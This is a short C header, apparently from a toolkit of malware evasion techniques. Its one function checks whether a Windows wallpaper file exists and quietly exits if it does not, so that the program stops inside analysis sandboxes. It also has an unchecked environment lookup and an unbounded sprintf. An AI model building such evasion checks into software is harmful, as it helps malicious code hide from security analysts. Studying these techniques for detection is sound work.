#pragma once

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "../debug_print/debug_print.h"


// Proceed if a background wallpaper is set, else exits
void has_background_wp(char *arg1) {
    char * appdata = getenv("APPDATA");

    if (!appdata) {
        DEBUG_PRINT("Unable to get APPDATA.\n");
    }
    char buffer[1024];
    sprintf(buffer, "%s\\Microsoft\\Windows\\Themes\\TranscodedWallpaper", appdata);

    DEBUG_PRINT("Applying has_background_wp evasion technique.\n");
    DEBUG_PRINT("Exiting if background wallpaper is not set\n");
   if( access(buffer, F_OK ) != -1 ) {
       DEBUG_PRINT("Proceed!\n");
    } else {
        exit(0);
    }
}
